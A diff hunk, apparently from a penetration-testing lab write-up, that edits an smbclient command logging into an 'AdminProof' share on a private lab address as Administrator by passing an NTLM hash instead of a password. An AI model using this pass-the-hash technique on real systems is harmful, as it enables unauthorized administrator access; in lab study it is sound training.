@@ -120,7 +120,7 @@ Blueprint:
 Command:
 
 ```bash
-smbclient //192.168.56.20/AdminProof -U Administrator%aad3b435b51404eeaad3b435b51404ee:b817733bdc947930b700cc2e567fb3ad --pw-nt-hash
+smbclient //192.168.56.20/AdminProof -U Administrator%b817733bdc947930b700cc2e567fb3ad --pw-nt-hash
 
 ```
 
